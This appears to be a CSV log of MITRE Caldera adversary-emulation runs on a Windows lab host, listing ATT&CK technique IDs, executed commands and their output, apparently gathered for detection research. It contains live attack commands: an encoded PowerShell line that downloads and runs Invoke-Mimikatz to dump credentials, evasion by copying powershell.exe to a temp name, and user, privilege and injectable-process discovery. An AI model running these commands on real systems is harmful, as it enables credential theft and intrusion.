System Mandatory Level        USER SETTINGS--------------        Last time Group Policy was applied: 3/8/2024 at 12:44:33 PM    Group Policy was applied from:      N/A    Group Policy slow link threshold:   500 kbps    Domain Name:                        DESKTOP-9LD827I    Domain Type:                        <Local Computer>        Applied Group Policy Objects    -----------------------------        N/A    The following GPOs were not applied because they were filtered out    -------------------------------------------------------------------        Local Group Policy            Filtering:  Not Applied (Empty)    The user is a part of the following security groups    ---------------------------------------------------        None        Everyone        Local account and member of Administrators group        BUILTIN\\Administrators        Performance Log Users        BUILTIN\\Users        NT AUTHORITY\\INTERACTIVE        CONSOLE LOGON        NT AUTHORITY\\Authenticated Users        This Organization        Local account        LOCAL        NTLM Authentication        High Mandatory Level        '],[''],['0'],['gpresult /R'],['Summary of permission and security groups'],['Permission Groups Discovery'],"[{'tactic': 'discovery', 'technique_name': 'Permission Groups Discovery: Local Groups', 'technique_id': 'T1069.001'}]",['windows'],['psh']
39,Initial-Success,execution,execution :: Command and Scripting Interpreter: PowerShell,execution :: ['PowerShell Invoke MimiKats'],execution :: T1059.001,operation__stockpile_windows_depfalse_pshtrue__t1059_001__execution__command_and_scripting_interpreter-_powershell__ccdb8caf-c69e-424b-b930-551969450c57__SAVED_2024-03-09_201229,stockpile_windows_depfalse_pshtrue__t1059_001__execution__command_and_scripting_interpreter-_powershell__ccdb8caf-c69e-424b-b930-551969450c57,['ccdb8caf-c69e-424b-b930-551969450c57'],1,1,1,[0],"['Hostname: DESKTOP-9LD827I / S-1-5-21-2334472832-2587113924-773976260  .#####.   mimikatz 2.1.1 (x64) built on Aug  3 2018 17:05:14 - lil! .## ^ ##.  ""A La Vie, A L\'Amour"" - (oe.eo) ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ##       > http://blog.gentilkiwi.com/mimikatz \'## v ##\'       Vincent LE TOUX             ( vincent.letoux@gmail.com )  \'#####\'        > http://pingcastle.com / http://mysmartlogon.com   ***/mimikatz(powershell) # sekurlsa::logonpasswordsERROR kuhl_m_sekurlsa_acquireLSA ; Logon listmimikatz(powershell) # exitBye!']","['#< CLIXML<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">2</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>']",['0'],['powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8ARQBtAHAAaQByAGUAUAByAG8AagBlAGMAdAAvAEUAbQBwAGkAcgBlAC8ANwBhADMAOQBhADUANQBmADEAMgA3AGIAMQBhAGUAYgA5ADUAMQBiADMAZAA5AGQAOAAwAGMANgBkAGMANgA0ADUAMAAwAGMAYQBjAGIANQAvAGQAYQB0AGEALwBtAG8AZAB1AGwAZQBfAHMAbwB1AHIAYwBlAC8AYwByAGUAZABlAG4AdABpAGEAbABzAC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAiACkAOwAgACQAbQAgAD0AIABJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAgAC0ARAB1AG0AcABDAHIAZQBkAHMAOwAgACQAbQAKAA=='],['Download'],['PowerShell Invoke MimiKats'],"[{'tactic': 'execution', 'technique_name': 'Command and Scripting Interpreter: PowerShell', 'technique_id': 'T1059.001'}]",['windows'],['psh']
41,Initial-Success,execution,execution :: Command and Scripting Interpreter: PowerShell,execution :: ['Emulate Administrator Tasks'],execution :: T1059.001,operation__stockpile_windows_depfalse_pshtrue__t1059_001__execution__command_and_scripting_interpreter-_powershell__315cedf1-4a3a-4015-b63f-149d64bacbbc__SAVED_2024-03-09_195450,stockpile_windows_depfalse_pshtrue__t1059_001__execution__command_and_scripting_interpreter-_powershell__315cedf1-4a3a-4015-b63f-149d64bacbbc,['315cedf1-4a3a-4015-b63f-149d64bacbbc'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['start powershell.exe -ArgumentList ""-NoP"",""-StA"",""-ExecutionPolicy"",""bypass"","".\\Emulate-Administrator-Tasks.ps1""']",['Emulate administrator tasks on a system in a separate process'],['Emulate Administrator Tasks'],"[{'tactic': 'execution', 'technique_name': 'Command and Scripting Interpreter: PowerShell', 'technique_id': 'T1059.001'}]",['windows'],['psh']
42,Initial-Success,defense-evasion,defense-evasion :: PowerShell,defense-evasion :: ['Move Powershell & triage'],defense-evasion :: T1059.001,operation__stockpile_windows_depfalse_pshtrue__t1059_001__defense-evasion__powershell__e5f9de8f-3df1-4e78-ad92-a784e3f6770d__SAVED_2024-03-09_193633,stockpile_windows_depfalse_pshtrue__t1059_001__defense-evasion__powershell__e5f9de8f-3df1-4e78-ad92-a784e3f6770d,['e5f9de8f-3df1-4e78-ad92-a784e3f6770d'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['Copy-Item C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe C:\\Windows\\Temp\\debug.exe;C:\\Windows\\Temp\\debug.exe get-process >> C:\\Windows\\temp\\debug.log;C:\\Windows\\Temp\\debug.exe get-localgroup >> C:\\Windows\\temp\\debug.log;C:\\Windows\\Temp\\debug.exe get-localuser >> C:\\Windows\\temp\\debug.log;C:\\Windows\\Temp\\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion >> C:\\Windows\\temp\\debug.log;'],['Copy powershell to non-standard location and perform triage commands'],['Move Powershell & triage'],"[{'tactic': 'defense-evasion', 'technique_name': 'PowerShell', 'technique_id': 'T1059.001'}]",['windows'],['psh']
43,Initial-Success,collection,collection :: Command and Scripting Interpreter: PowerShell,collection :: ['cmd.exe information gathering'],collection :: T1059.001,operation__stockpile_windows_depfalse_pshtrue__t1059_001__collection__command_and_scripting_interpreter-_powershell__55678719-e76e-4df9-92aa-10655bbd1cf4__SAVED_2024-03-09_191844,stockpile_windows_depfalse_pshtrue__t1059_001__collection__command_and_scripting_interpreter-_powershell__55678719-e76e-4df9-92aa-10655bbd1cf4,['55678719-e76e-4df9-92aa-10655bbd1cf4'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['cmd.exe /c ""net user"" >> C:\\Windows\\temp\\history.log;cmd.exe /c ""whoami /priv"" >> C:\\Windows\\temp\\history.log;cmd.exe /c ""netstat -ano"" >> C:\\Windows\\temp\\history.log;']",['User enumeration'],['cmd.exe information gathering'],"[{'tactic': 'collection', 'technique_name': 'Command and Scripting Interpreter: PowerShell', 'technique_id': 'T1059.001'}]",['windows'],['psh']
44,Initial-Success,collection,collection :: Command and Scripting Interpreter: PowerShell,collection :: ['PowerShell information gathering'],collection :: T1059.001,operation__stockpile_windows_depfalse_pshtrue__t1059_001__collection__command_and_scripting_interpreter-_powershell__702bfdd2-9947-4eda-b551-c3a1ea9a59a2__SAVED_2024-03-09_192740,stockpile_windows_depfalse_pshtrue__t1059_001__collection__command_and_scripting_interpreter-_powershell__702bfdd2-9947-4eda-b551-c3a1ea9a59a2,['702bfdd2-9947-4eda-b551-c3a1ea9a59a2'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['powershell.exe -c ""Get-WmiObject -class win32_operatingsystem | select -property * | export-csv msdebug.log"";']",['System Information Gathering Script'],['PowerShell information gathering'],"[{'tactic': 'collection', 'technique_name': 'Command and Scripting Interpreter: PowerShell', 'technique_id': 'T1059.001'}]",['windows'],['psh']
45,Initial-Success,discovery,discovery :: Process Discovery,discovery :: ['View Processes'],discovery :: T1057,operation__stockpile_windows_depfalse_pshtrue__t1057__discovery__process_discovery__335cea7b-bec0-48c6-adfb-6066070f5f68__SAVED_2024-03-09_185149,stockpile_windows_depfalse_pshtrue__t1057__discovery__process_discovery__335cea7b-bec0-48c6-adfb-6066070f5f68,['335cea7b-bec0-48c6-adfb-6066070f5f68'],1,1,1,[0],['Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                  -------  ------    -----      -----     ------     --  -- -----------                                                      268      17     5572      26056       0.20   8392   1 ApplicationFrameHost                                             172      10     6412       9968       1.27   7696   0 audiodg                                                           72       5     3036       4752       0.03   6512   1 cmd                                                              120       8     3984       7724       0.05   7372   1 cmd                                                              121      10     6720      15068       0.06   6044   1 conhost                                                          187      12     7164      18292       2.95   6096   1 conhost                                                          263      14    10080      23424       0.39   7452   1 conhost                                                          598      23     1864       5600       0.27    444   0 csrss                                                            397      18     1880       5572       0.58    532   1 csrss                                                            438      16     4224      21300       0.30   4372   1 ctfmon                                                           316      14     2512       9176       0.00   3092   0 dasHost                                                          134       8     1664       7444       0.00   6552   1 dllhost                                                          232      16     3376      12148       0.14   7164   1 dllhost                                                          926      48    34792      66376       1.88    320   1 dwm                                                             2337      85    58036     132532       2.38   4776   1 explorer                                                          36       6     1636       4676       0.05    784   1 fontdrvhost                                                       36       5     1268       3372       0.00    792   0 fontdrvhost                                                      664      29    10220      33864       0.25   5460   1 HxTsr                                                              0       0       60          8                 0   0 Idle                                                             659      48  1409124    1087596      71.22   7576   1 java                                                            1401      26     7832      21816       1.38    668   0 lsass                                                              0       0       40          0       0.00   1728   0 Memory Compression                                               107       7     1476      19500       0.06   7156   0 MicrosoftEdge_X64_122.0.2365.80_122.0.2365.66                    213      13     2208      10236       0.14   6256   0 MicrosoftEdgeUpdate                                              178      11     1708       9656       0.03   6384   0 MicrosoftEdgeUpdate                                              510      21     3812      18348       0.38   7580   0 MicrosoftEdgeUpdate                                              212      13     2020       2064       0.02   8148   0 MicrosoftEdgeUpdate                                              442      19    12464      27596       0.83   4748   0 MoUsoCoreWorker                                                  672      88   246080     175640       6.20   3028   0 MsMpEng                                                         1335      99    47096     148672       1.11   6660   1 PhoneExperienceHost                                              501      26    69512      73868       0.38   7760   1 powershell                                                       271      18    11940      24928       0.16   7084   1 python3.10                                                       247      15    17220       2436       0.16   1800   0 pythonw                                                            0      12     6884     107456       0.28     92   0 Registry                                                         141      11     2040       8432       0.02   6608   1 rundll32                                                         244      14     3372      18812       0.13    696   1 RuntimeBroker                                                    312      16     3932      22948       0.30   3720   1 RuntimeBroker                                                    233      13     3084      20012       0.00   4660   1 RuntimeBroker                                                    127       8     1700       8044       0.00   4948   1 RuntimeBroker                                                    252      15     3588      22668       0.25   5224   1 RuntimeBroker                                                    603      28    12268      42968       0.86   5684   1 RuntimeBroker                                                    218      11     2824      17420       0.03   6468   1 RuntimeBroker                                                    213      12     2604      14244       0.05   6940   1 RuntimeBroker                                                   1650     129   184672     274072       6.91   5492   1 SearchApp                                                        172       9     2172       9360       0.00   1216   0 SearchFilterHost                                                 773      72    29424      32220       1.50   6832   0 SearchIndexer                                                    357      13     2592      10916       0.03   5780   0 SearchProtocolHost                                               598      19     5844      20088       0.19   4212   0 SecurityHealthService                                            160       9     1688       9116       0.03   4052   1 SecurityHealthSystray                                            687      13     4936      10140       0.97    640   0 services                                                          79       8     2604       6548       0.00    304   0 setup                                                            161       9     6020     192040       8.45   7104   0 setup                                                            105       7     4328       7208       0.03   2088   0 SgrmBroker                                                       600      27    11200      46776       1.06   1304   1 ShellExperienceHost                                              608      20     6456      30408       0.48   3824   1 sihost                                                           439    1133   544248     556480      26.89   8656   0 SilkService                                                       53       3     1068       1196       0.02    340   0 smss                                                             132      11    18480      10236       0.08   6504   1 splunkd                                                          518      28     6744      20772       0.23   2108   0 spoolsv                                                          150       9     1736       8500       0.00   9048   0 SppExtComObj                                                     246      11     8500      17204       7.70   3220   0 sppsvc                                                           120      11     2004       7380       0.02   2976   0 sshd                                                             727      34    22316      71540       0.55   5108   1 StartMenuExperienceHost                                          115       7     1244       5588       0.00    448   0 svchost                                                          155       7     1440       6268       0.02    680   0 svchost                                                          185      10     2020       8036       0.02    740   0 svchost                                                         1608      22    10836      28960       0.97    776   0 svchost                                                         1214      20     7092      15740       3.50    892   0 svchost                                                          268      10     2540       8552       0.30    948   0 svchost                                                          277       9     1956       8368       0.02   1028   0 svchost                                                          218      12     2172      10132       0.03   1048   0 svchost                                                          432      18     6640      16156       0.88   1128   0 svchost                                                          122       8     1380       7360       0.02   1208   0 svchost                                                          253      13     3352      14060       0.05   1224   0 svchost                                                          402      14    18564      21940       0.42   1256   0 svchost                                                          269      10     2684      10016       0.34   1340   0 svchost                                                          145      22     4776       9012       0.09   1372   0 svchost                                                          232      10     2184       7736       0.06   1440   0 svchost                                                          199      12     2240      12836       0.05   1520   0 svchost                                                          388      14     4008      11520       0.06   1576   0 svchost                                                          171       9     1932       7852       0.00   1592   0 svchost                                                          247      16   101268     110256      14.38   1600   0 svchost                                                          177       7     1308       6024       0.00   1620   0 svchost                                                          143      10     1660       8112       0.02   1684   0 svchost                                                          169      11     1796       8336       0.05   1764   0 svchost                                                          146       9     1644       7384       0.02   1808   0 svchost                                                          174       9     1724       8088       0.05   1816   0 svchost                                                          479      12     2932       9900       0.56   1844   0 svchost                                                          360      14     3180      13960       0.06   1920   0 svchost                                                          233      12     2332      11768       0.02   1944   0 svchost                                                          223      12     2972      11148       0.02   1956   0 svchost                                                          273      13     2728       8088       0.14   1964   0 svchost                                                          139      10     1684       6628       0.05   1972   0 svchost                                                          367      14     2424       9712       0.11   1980   0 svchost                                                          223      10    16132      25052       4.27   2080   0 svchost                                                          447      33     9068      18164       0.64   2172   0 svchost                                                          185      10     1964       8340       0.02   2212   0 svchost                                                          109       7     1300       5676       0.02   2284   0 svchost                                                          181       9     1928       7580       0.14   2296   0 svchost                                                          966      86    75368      65712      26.09   2324   0 svchost                                                          424      15    11052      20976       2.27   2616   0 svchost                                                          365      16     2700      10932       0.05   2652   0 svchost                                                          264      13     2524       8120       0.02   2660   0 svchost                                                          165      12     1652       7424       0.00   2672   0 svchost                                                          382      26     4288      14028       0.17   2736   0 svchost                                                          140       7     1320       6572       0.00   2748   0 svchost                                                          592      24    16460      33668       1.09   2760   0 svchost                                                          320      17     8944      16736       0.41   2784   0 svchost                                                          319      18     4060      16248       0.02   2840   0 svchost                                                          209      12     2388       9400       0.14   2900   0 svchost                                                          136       9     1560       6960       0.02   2948   0 svchost                                                          128       7     1276       5860       0.00   3000   0 svchost                                                          408      19     5012      21744       0.09   3016   0 svchost                                                          599      27     9636      39308       0.56   3380   1 svchost                                                          383      24     3512      13292       0.00   3408   0 svchost                                                          224      14     2024       7680       0.02   3452   0 svchost                                                          153       8     1788       7864       0.02   3596   0 svchost                                                          746      31    59792      85804      20.22   3748   0 svchost                                                          375      19     8716      32020       0.30   3972   1 svchost                                                          672      50    10208      22380       1.28   4076   0 svchost                                                          299      13     3684      16184       0.84   4164   0 svchost                                                          169       9     1808       8208       0.00   4264   0 svchost                                                          186      10     3512       8088       0.02   4580   0 svchost                                                          201      11     1868       8564       0.00   4812   0 svchost                                                          249      12     3216      18616       0.05   5068   1 svchost                                                          213      13     2668      12316       0.17   5088   0 svchost                                                          404      19     5376      18184       0.23   5252   0 svchost                                                          337      18     4608      23792       0.14   5800   0 svchost                                                          389      18     4620      17112       0.23   5812   0 svchost                                                          177      13     4040      17672       0.41   5956   0 svchost                                                          126       8     1588       6336       0.02   5960   0 svchost                                                          130       8     2976       8228       0.08   6088   0 svchost                                                          357      13     3052      13868       0.08   6152   0 svchost                                                          220      13     1908       8464       0.00   6328   0 svchost                                                          277      12     2484      12264       0.03   6472   0 svchost                                                          131       9     1784       8204       0.02   7184   0 svchost                                                          214      13     2768      12112       0.03   7236   0 svchost                                                          504      16     7460      24660       0.45   7256   0 svchost                                                          473      25     5788      22008       0.11   7284   1 svchost                                                          224      12     2828      11720       1.13   7864   0 svchost                                                          507      19     5080      15672       0.17   8672   0 svchost                                                          138       9     1644      11484       0.00   8900   0 svchost                                                         2933       0      196        148       8.45      4   0 System                                                           327      19     4396      15864       0.06   2956   1 taskhostw                                                        301      35     7032      17396       0.23   3780   1 taskhostw                                                        542      22     8952      39196       0.17   7008   1 TextInputHost                                                    226      59    30992      36136       1.56   4192   0 TiWorker                                                         154       9     2164       7840       0.05   8744   0 TrustedInstaller                                                 114       7     1332       6672       0.02   2632   0 uhssvc                                                           164      11     1364       7288       0.05    520   0 wininit                                                          270      12     2588      12160       0.03    616   1 winlogon                                                         269      16     4908      14792       0.06   4896   0 WmiPrvSE                                                         507      20     8184      22616       1.81   5172   0 WmiPrvSE                                                     '],[''],['0'],['get-process'],['Display information about current system processes'],['View Processes'],"[{'tactic': 'discovery', 'technique_name': 'Process Discovery', 'technique_id': 'T1057'}]",['windows'],['psh']
46,Initial-Success,discovery,discovery :: Process Discovery,discovery :: ['tasklist Process Enumeration'],discovery :: T1057,operation__stockpile_windows_depfalse_pshtrue__t1057__discovery__process_discovery__8adf02e8-6e71-4244-886c-98c402857404__SAVED_2024-03-09_190944,stockpile_windows_depfalse_pshtrue__t1057__discovery__process_discovery__8adf02e8-6e71-4244-886c-98c402857404,['8adf02e8-6e71-4244-886c-98c402857404'],1,1,1,[0],,[''],['0'],['tasklist /m  >> $env:APPDATA\\vmtool.log;cat $env:APPDATA\\vmtool.log'],['Capture running processes and their loaded DLLs'],['tasklist Process Enumeration'],"[{'tactic': 'discovery', 'technique_name': 'Process Discovery', 'technique_id': 'T1057'}]",['windows'],['psh']
47,Initial-Success,discovery,discovery :: Process Discovery,discovery :: ['Discover injectable process'],discovery :: T1057,operation__stockpile_windows_depfalse_pshtrue__t1057__discovery__process_discovery__05cda6f6-2b1b-462e-bff1-845af94343f7__SAVED_2024-03-09_184259,stockpile_windows_depfalse_pshtrue__t1057__discovery__process_discovery__05cda6f6-2b1b-462e-bff1-845af94343f7,['05cda6f6-2b1b-462e-bff1-845af94343f7'],1,1,1,[0],"['[    {        ""ProcessName"":  ""svchost"",        ""Id"":  3380,        ""Owner"":  ""puma-4""    },    {        ""ProcessName"":  ""svchost"",        ""Id"":  3972,        ""Owner"":  ""puma-4""    },    {        ""ProcessName"":  ""svchost"",        ""Id"":  5068,        ""Owner"":  ""puma-4""    },    {        ""ProcessName"":  ""svchost"",        ""Id"":  7284,        ""Owner"":  ""puma-4""    }]']",[''],['0'],"['$owners = @{};gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};$ps = get-process | select processname,Id,@{l=""Owner"";e={$owners[$_.id.tostring()]}};$valid = foreach($p in $ps) { if($p.Owner -eq $env:USERNAME -And $p.ProcessName -eq ""svchost"") {$p} };$valid | ConvertTo-Json']",['Discovers processes that the current user has the ability to access and selects an injectable one'],['Discover injectable process'],"[{'tactic': 'discovery', 'technique_name': 'Process Discovery', 'technique_id': 'T1057'}]",['windows'],['psh']
48,Initial-Success,discovery,discovery :: Process Discovery,discovery :: ['PowerShell Process Enumeration'],discovery :: T1057,operation__stockpile_windows_depfalse_pshtrue__t1057__discovery__process_discovery__4d9b079c-9ede-4116-8b14-72ad3a5533af__SAVED_2024-03-09_190048,stockpile_windows_depfalse_pshtrue__t1057__discovery__process_discovery__4d9b079c-9ede-4116-8b14-72ad3a5533af,['4d9b079c-9ede-4116-8b14-72ad3a5533af'],1,1,1,[0],['Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                  -------  ------    -----      -----     ------     --  -- -----------                                                      268      17     5572      26056       0.20   8392   1 ApplicationFrameHost                                             172      10     6416       9968       1.17   7696   0 audiodg                                                           72       5     3040       5112       0.05   6392   1 cmd                                                              120       8     3984       7728       0.05   7372   1 cmd                                                              187      12     7132      18368       3.38   5952   1 conhost                                                          263      14    10080      23424       0.41   7452   1 conhost                                                          121      10     6668      15048       0.03   8024   1 conhost                                                          581      23     1868       5580       0.27    444   0 csrss                                                            394      18     1936       5584       0.59    532   1 csrss                                                            438      16     4224      21308       0.30   4372   1 ctfmon                                                           316      14     2540       9192       0.00   3092   0 dasHost                                                          127       8     1588       7384       0.00   3852   1 dllhost                                                          232      16     3376      12148       0.14   7164   1 dllhost                                                          926      47    34808      66384       2.31    320   1 dwm                                                             2424      87    59488     135336       2.72   4776   1 explorer                                                          36       6     1636       4676       0.06    784   1 fontdrvhost                                                       36       5     1268       3372       0.00    792   0 fontdrvhost                                                        0       0       60          8                 0   0 Idle                                                             661      47  1365232    1141988      75.52   5768   1 java                                                            1386      26     7912      21928       1.63    668   0 lsass                                                              0       0       40          0       0.00   1728   0 Memory Compression                                               106       7     1520      19532       0.14   8652   0 MicrosoftEdge_X64_122.0.2365.80_122.0.2365.66                    213      13     2304      10232       0.17   7740   0 MicrosoftEdgeUpdate                                              212      13     2024       2076       0.05   8316   0 MicrosoftEdgeUpdate                                              510      21     3816      18332       0.34   8732   0 MicrosoftEdgeUpdate                                              431      19    13680      28532       0.89   4728   0 MoUsoCoreWorker                                                  672      88   245384     175536       6.19   3028   0 MsMpEng                                                         1337      99    47232     148760       1.14   6660   1 PhoneExperienceHost                                              508      26    77424      80884       0.42   7468   1 powershell                                                       271      18    11944      24948       0.09   7084   1 python3.10                                                       247      15    17220       2436       0.17   1800   0 pythonw                                                            0      10     6704      80324       0.28     92   0 Registry                                                         141      11     2044       8424       0.03   3696   1 rundll32                                                         391      21     5260      28284       0.38   3720   1 RuntimeBroker                                                    305      18     4384      26020       0.28   5224   1 RuntimeBroker                                                    627      27    12364      41216       0.91   5684   1 RuntimeBroker                                                    218      11     2832      17448       0.02   6468   1 RuntimeBroker                                                    213      12     2604      14244       0.05   6940   1 RuntimeBroker                                                   1678     142   187432     277136       7.45   5492   1 SearchApp                                                        173       9     2136       9324       0.02   2500   0 SearchFilterHost                                                 778      72    29540      32344       1.48   6832   0 SearchIndexer                                                    354      13     2516      10892       0.02   4580   0 SearchProtocolHost                                               596      19     5844      20088       0.20   4212   0 SecurityHealthService                                            160       9     1688       9116       0.03   4052   1 SecurityHealthSystray                                            680      13     4948      10164       1.06    640   0 services                                                         105       7     3992       7216       0.03   2088   0 SgrmBroker                                                       599      27    11208      46768       1.02   1304   1 ShellExperienceHost                                              607      20     6728      30496       0.50   3824   1 sihost                                                           444    1234   589952     602504      41.89   8580   0 SilkService                                                       53       3     1068       1196       0.02    340   0 smss                                                             133      11    18296      10152       0.03   3388   1 splunkd                                                          518      28     6744      20788       0.22   2108   0 spoolsv                                                          148       9     1692       8472       0.00   2528   0 SppExtComObj                                                     241      11     8476      17104       7.94   7176   0 sppsvc                                                           120      11     2004       7380       0.02   2976   0 sshd                                                             733      34    22388      71672       0.61   5108   1 StartMenuExperienceHost                                          115       7     1244       5588       0.00    448   0 svchost                                                          155       7     1440       6268       0.02    680   0 svchost                                                          124       8     1536       6312       0.00    704   0 svchost                                                          185      10     2020       8032       0.02    740   0 svchost                                                         1593      22    10836      28932       1.03    776   0 svchost                                                         1188      20     7184      15832       3.78    892   0 svchost                                                          267      10     2540       8548       0.19    948   0 svchost                                                          277       9     1952       8356       0.00   1028   0 svchost                                                          218      12     2160      10124       0.05   1048   0 svchost                                                          430      18     6616      16104       0.67   1128   0 svchost                                                          122       8     1380       7360       0.02   1208   0 svchost                                                          253      13     3364      14072       0.06   1224   0 svchost                                                          399      14    18636      22148       0.44   1256   0 svchost                                                          265      10     2628       9988       0.28   1340   0 svchost                                                          146      22     4852       9104       0.05   1372   0 svchost                                                          232      10     2184       7740       0.08   1440   0 svchost                                                          194      12     2240      12824       0.05   1520   0 svchost                                                          388      14     4008      11520       0.06   1576   0 svchost                                                          171       9     1932       7852       0.00   1592   0 svchost                                                          248      16   105556     114588      16.30   1600   0 svchost                                                          177       7     1308       6020       0.00   1620   0 svchost                                                          143      10     1664       8112       0.02   1684   0 svchost                                                          169      11     1796       8336       0.05   1764   0 svchost                                                          146       9     1644       7384       0.02   1808   0 svchost                                                          174       9     1724       8088       0.05   1816   0 svchost                                                          370      16     7740      25660       0.47   1836   0 svchost                                                          473      12     2924       9876       0.41   1844   0 svchost                                                          360      14     3192      13980       0.08   1920   0 svchost                                                          233      12     2332      11772       0.02   1944   0 svchost                                                          222      12     2972      11140       0.02   1956   0 svchost                                                          273      13     2736       8100       0.09   1964   0 svchost                                                          138      10     1684       6636       0.08   1972   0 svchost                                                          367      14     2456       9720       0.08   1980   0 svchost                                                          213      11    10312      19180       4.70   2080   0 svchost                                                          446      33     9292      18424       0.97   2172   0 svchost                                                          184      10     1976       8348       0.02   2212   0 svchost                                                          109       7     1352       5684       0.03   2284   0 svchost                                                          178       9     1952       7592       0.08   2296   0 svchost                                                          974      87    76004      61408      22.63   2324   0 svchost                                                          413      15    10940      21012       2.02   2616   0 svchost                                                          365      16     2700      10932       0.05   2652   0 svchost                                                          264      13     2524       8120       0.02   2660   0 svchost                                                          165      12     1660       7432       0.00   2672   0 svchost                                                          388      26     4260      14044       0.16   2736   0 svchost                                                          140       7     1320       6572       0.00   2748   0 svchost                                                          589      24    16540      33752       0.97   2760   0 svchost                                                          317      17     8776      16804       0.41   2784   0 svchost                                                          153       8     1836       7880       0.03   2792   0 svchost                                                          315      17     4048      16256       0.03   2840   0 svchost                                                          209      12     2388       9396       0.08   2900   0 svchost                                                          136       9     1560       6960       0.02   2948   0 svchost                                                          128       7     1276       5860       0.00   3000   0 svchost                                                          406      19     4920      21680       0.13   3016   0 svchost                                                          579      27     9500      39212       0.47   3380   1 svchost                                                          383      24     3516      13292       0.00   3408   0 svchost                                                          224      15     2060       7676       0.02   3452   0 svchost                                                          610      32    54216      78436      20.00   3748   0 svchost                                                          370      18     8708      32072       0.23   3972   1 svchost                                                          293      13     3672      16180       0.83   4164   0 svchost                                                          553      42     8320      20908       1.02   4240   0 svchost                                                          169       9     1828       8228       0.00   4264   0 svchost                                                          201      11     1868       8564       0.00   4812   0 svchost                                                          249      12     3216      18616       0.06   5068   1 svchost                                                          218      13     2836      12456       0.22   5088   0 svchost                                                          411      19     5424      18244       0.20   5252   0 svchost                                                          341      18     4696      23880       0.13   5800   0 svchost                                                          389      18     4640      17140       0.20   5812   0 svchost                                                          130       8     2976       8220       0.05   6088   0 svchost                                                          195      11     3724       8584       0.02   6112   0 svchost                                                          357      13     3052      13864       0.08   6152   0 svchost                                                          277      12     2484      12268       0.03   6472   0 svchost                                                          491      18     4800      15604       0.17   7140   0 svchost                                                          131       9     1784       8208       0.02   7184   0 svchost                                                          214      13     2768      12112       0.03   7236   0 svchost                                                          458      25     5796      22016       0.13   7284   1 svchost                                                          228      12     2880      11748       0.94   7864   0 svchost                                                          175      12     3844      17592       0.38   8744   0 svchost                                                          138       9     1644      11484       0.00   8900   0 svchost                                                          219      13     1888       8448       0.02   9172   0 svchost                                                         2919       0      196        148       8.83      4   0 System                                                           325      19     4580      15904       0.08   2956   1 taskhostw                                                        297      34     7080      17368       0.22   3780   1 taskhostw                                                        542      22     8984      39216       0.14   7008   1 TextInputHost                                                    114       7     1336       6676       0.02   2632   0 uhssvc                                                           482      23     8140      29252       0.42   1548   1 WindowsPackageManagerServer                                      164      11     1364       7288       0.05    520   0 wininit                                                          270      12     2588      12148       0.03    616   1 winlogon                                                         495      20     8148      22708       1.80   1636   0 WmiPrvSE                                                         268      16     5140      15056       0.03   5104   0 WmiPrvSE                                                     '],[''],['0'],['get-process >> $env:APPDATA\\vmtools.log;cat $env:APPDATA\\vmtools.log'],['Capture running processes via PowerShell'],['PowerShell Process Enumeration'],"[{'tactic': 'discovery', 'technique_name': 'Process Discovery', 'technique_id': 'T1057'}]",['windows'],['psh']
